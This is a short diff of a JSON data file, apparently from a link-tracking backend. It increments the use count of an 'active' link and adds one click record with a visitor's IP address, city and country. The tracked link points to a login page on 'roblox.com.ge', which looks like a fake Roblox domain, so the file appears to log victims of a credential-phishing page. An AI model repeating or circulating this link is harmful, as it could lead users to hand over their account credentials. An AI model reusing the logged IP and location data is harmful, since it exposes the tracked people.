@@ -118,7 +118,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 929,
+    "useCount": 930,
     "createdBy": "admin",
     "clicks": [
       {
@@ -7552,6 +7552,14 @@
         "city": "Bottrop",
         "flag": "🇩🇪",
         "countryCode": "DE"
+      },
+      {
+        "timestamp": 1777202657548,
+        "ip": "89.67.36.50",
+        "country": "Poland",
+        "city": "Terespol",
+        "flag": "🇵🇱",
+        "countryCode": "PL"
       }
     ]
   },
